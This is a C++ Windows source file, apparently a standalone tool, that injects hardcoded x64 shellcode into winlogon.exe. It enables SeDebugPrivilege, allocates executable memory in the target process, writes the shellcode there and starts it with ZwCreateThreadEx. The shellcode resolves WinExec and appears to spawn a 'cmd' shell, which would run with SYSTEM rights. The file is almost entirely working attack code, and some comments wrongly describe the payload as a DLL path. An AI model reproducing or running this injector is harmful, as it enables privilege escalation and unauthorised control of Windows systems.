// Systemcmd.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#pragma once
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

//神奇的东西
unsigned char code0[] =
{
	0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x48,0x83,0xEC,0x28,0x4D,0x31,0xC0,0x48,0x31,0xC9,0x4D,0x31,0xD2,0x49,0x83,
	0xC2,0x60,0x65,0x49,0x8B,0x02,0x48,0x8B,0x40,0x18,0x48,0x8B,0x70,0x20,0x48,0xAD,0x48,0x96,0x48,0xAD,0x48,0x8B,
	0x58,0x20,0x4D,0x31,0xC0,0x44,0x8B,0x43,0x3C,0x48,0x31,0xD2,0x4C,0x89,0xC2,0x48,0x01,0xDA,0x48,0xC7,0xC0,0xFF,
	0xFF,0xFF,0xFF,0x48,0x2D,0x77,0xFF,0xFF,0xFF,0x44,0x8B,0x04,0x02,0x49,0x01,0xD8,0x48,0x31,0xF6,0x41,0x8B,0x70,
	0x20,0x48,0x01,0xDE,0x48,0x31,0xC9,0x41,0xB9,0x57,0x69,0x6E,0x45,0x48,0xFF,0xC1,0x48,0x31,0xC0,0x8B,0x04,0x8E,
	0x48,0x01,0xD8,0x44,0x39,0x08,0x75,0xEF,0x48,0x31,0xF6,0x41,0x8B,0x70,0x24,0x48,0x01,0xDE,0x66,0x8B,0x0C,0x4E,
	0x48,0x31,0xF6,0x41,0x8B,0x70,0x1C,0x48,0x01,0xDE,0x48,0x31,0xD2,0x8B,0x14,0x8E,0x48,0x01,0xDA,0x48,0x89,0xD7,
	0x48,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x48,0x2D,0x9C,0x92,0x9B,0xFF,0x50,0x48,0x89,0xE1,0x48,0x31,0xD2,0x48,0x83,
	0xC2,0x05,0xFF,0xD7,0x48,0x83,0xC4,0x30,0x5D,0x5F,0x5E,0x5B,0x5A,0x59,0x58,0xC3
};


/*判断系统架构，并定义ZwCreateThreadEx函数指针*/
#ifdef _WIN64
typedef	DWORD(WINAPI* pZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	ULONG CreateThreadFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	LPVOID pUnkown
	);
#else
typedef DWORD(WINAPI* pZwCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	LPVOID ObjectAttributes,
	HANDLE ProcessHandle,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	BOOL CreateSuspended,
	DWORD dwStackSize,
	DWORD dw1,
	DWORD dw2,
	LPVOID pUnkown
	);
#endif

/*
设定本进程的程序调试权限
lPcstr:权限字符串
backCode:错误返回码
*/
BOOL GetDebugPrivilege(_In_ LPCSTR lPcstr, _Inout_ DWORD* backCode)
{
	HANDLE Token = NULL;
	LUID luid = { 0 };
	TOKEN_PRIVILEGES Token_privileges = { 0 };
	//内存初始化为zero
	memset(&luid, 0x00, sizeof(luid));
	memset(&Token_privileges, 0x00, sizeof(Token_privileges));

	//打开进程令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token))
	{
		*backCode = 0x01;
		return FALSE;
	}

	//获取特权luid
	if (!LookupPrivilegeValue(NULL, lPcstr, &luid))
	{
		*backCode = 0x02;
		return FALSE;
	}

	//设定结构体luid与特权
	Token_privileges.PrivilegeCount = 1;
	Token_privileges.Privileges[0].Luid = luid;
	Token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//修改进程特权
	if (!AdjustTokenPrivileges(Token, FALSE, &Token_privileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		*backCode = 0x03;
		return FALSE;
	}
	*backCode = 0x00;
	return TRUE;
}

/*
根据进程名获取进程pid，执行无误返回进程pid，出错返回-1
ProcessName:进程名
backCode:错误返回码
*/
int GetProcessPid(_In_ const char* ProcessName, _Inout_ DWORD* backCode)
{
	PROCESSENTRY32 P32 = { 0 };
	HANDLE H32 = NULL;
	//内存初始化为zeor
	memset(&P32, 0X00, sizeof(P32));
	//创建快照
	H32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	P32.dwSize = sizeof(P32);
	if (H32 == NULL)
	{
		*backCode = 0x01;
		return -1;
	}
	//开始循环遍历进程
	BOOL ret = Process32First(H32, &P32);
	while (ret)
	{
		//发现指定进程存在
		if (!strcmp(P32.szExeFile, ProcessName))
		{
			*backCode = 0x00;
			return P32.th32ProcessID;
		}
		ret = Process32Next(H32, &P32);
	}
	*backCode = 0x01;
	return -1;
}

int main(int argv, char* argc[])
{
	//对必要的变量进行声明以及初始化
	DWORD backCode = 0;
	HANDLE hProcess = NULL;
	LPVOID Buff = NULL;
	HMODULE Ntdll = NULL;
	SIZE_T write_len = 0;
	DWORD dwStatus = 0;
	HANDLE hRemoteThread = NULL;

	//通过进程名获取pid
	int pid = GetProcessPid("winlogon.exe", &backCode);
	if (pid == -1)
	{
		puts("pid get error");
		return 0;
	}

	//提升进程特权，获得调试权限
	if (!GetDebugPrivilege(SE_DEBUG_NAME, &backCode))
	{
		puts("Debug privilege error");
		printf(" %d", backCode);
		return 0;
	}

	//打开要被注入的进程
	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
	{
		puts("process opening error");
		return 0;
	}

	//在要被注入的进程中创建内存，用于存放注入dll的路径
	Buff = VirtualAllocEx(hProcess, NULL, sizeof(code0), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Buff == NULL)
	{
		puts("Buff alloc error");
		return 0;
	}

	//将dll路径写入刚刚创建的内存中
	WriteProcessMemory(hProcess, Buff, code0, sizeof(code0), &write_len);
	if (sizeof(code0) != write_len)
	{
		puts("write error");
		return 0;
	}

	//加载ntdll.dll并从中获取内核函数ZwCreateThread，并使用函数指针指向此函数
	Ntdll = LoadLibrary("ntdll.dll");
	pZwCreateThreadEx ZwCreateThreadEx = (pZwCreateThreadEx)GetProcAddress(Ntdll, "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		puts("function get error");
		return 0;
	}

	//执行ZwCreateThread函数，在指定进程中创建线程加载要被注入的dll
	dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)Buff, NULL, 0, 0, 0, 0, NULL);
	if (hRemoteThread == NULL)
	{
		puts("createthread function error");
		return 0;
	}

	//释放不需要的变量以及内存
	CloseHandle(hProcess);
	FreeModule(Ntdll);
	ExitProcess(0);
	return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
